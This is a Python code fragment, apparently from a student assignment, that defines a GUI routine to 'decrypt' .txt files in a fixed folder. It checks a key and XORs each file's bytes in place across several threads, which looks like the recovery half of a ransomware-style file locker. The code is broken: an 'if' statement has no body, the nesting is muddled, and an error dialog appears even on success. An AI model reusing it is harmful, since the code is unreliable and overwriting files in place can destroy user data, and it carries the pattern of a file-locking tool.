def decryption():
    def decryptor():
        try:
            if key == keys3:
        except:
            print("Wrong")      
        def decrypt(key):
            try: 
                if key == keys3: 
                    while q.not_empty:
                        file = q.get()
                        index = 0
                        max_index = len(key) - 1
                        try:
                            with open(file, 'rb') as f:
                                data = f.read()
                            with open(file, 'w') as f:
                                f.write('')
                                for byte in data:
                                    xor_byte = byte ^ ord(key[index])
                                    with open(file, 'ab') as f:
                                        f.write(xor_byte.to_bytes(1, 'little'))
                                    if index >= max_index:
                                        index = 0 
                                    else: 
                                        index += 1
                        except:
                            msg = 'Failed to decrypt.'
                        q.task_done()
                else:
                    msg = 'Wrong decryption Key.'
                    messagebox.showerror('Info', msg)
            except ValueError:
                msg = 'Wrong Decryption Key.'
            messagebox.showerror('Info', msg)

        encrypted_ext = ('.txt',)
        file_paths = []
        for root, dirs, files in os.walk("E:\Python Semester 2\Assignment"):
            for file in files:
                file_path, file_ext = os.path.splitext(root+'\\'+file)
                if file_ext in encrypted_ext:
                    file_paths.append(root+'\\'+file)

        key = num_from.get()

        q =queue.Queue()
        for file in file_paths:
            q.put(file)

        for i in range(10):
            thread = threading.Thread(target=decrypt, args=(key,), daemon=True)
            thread.start()

        q.join()
